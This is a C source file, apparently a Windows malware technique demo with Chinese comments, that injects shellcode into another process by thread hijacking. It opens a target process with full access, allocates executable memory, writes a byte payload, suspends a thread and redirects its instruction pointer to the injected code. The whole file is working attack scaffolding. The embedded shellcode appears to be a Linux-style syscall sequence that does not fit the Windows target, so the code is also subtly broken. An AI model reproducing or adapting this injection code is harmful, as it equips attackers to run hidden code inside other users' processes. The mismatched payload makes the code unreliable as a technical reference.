#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

unsigned char shellcode[] =
"\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50"
"\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05";

DWORD GetThreadIdByProcessId(DWORD pid) {
    THREADENTRY32 te;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    te.dwSize = sizeof(te);
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                CloseHandle(hSnapshot);
                return te.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    DWORD pid = 1234; //目标进程ID
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("无法打开目标进程\n");
        return 1;
    }

    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemoteCode == NULL) {
        printf("无法分配内存\n");
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, pRemoteCode, shellcode, sizeof(shellcode), NULL)) {
        printf("无法写入内存\n");
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    DWORD tid = GetThreadIdByProcessId(pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (hThread == NULL) {
        printf("无法打开目标线程\n");
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    SuspendThread(hThread);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        printf("无法获取线程上下文\n");
        ResumeThread(hThread);
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    ctx.Rip = (DWORD64)pRemoteCode; // 修改RIP寄存器指向Shellcode

    if (!SetThreadContext(hThread, &ctx)) {
        printf("无法设置线程上下文\n");
        ResumeThread(hThread);
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    ResumeThread(hThread);

    printf("线程劫持成功\n");

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
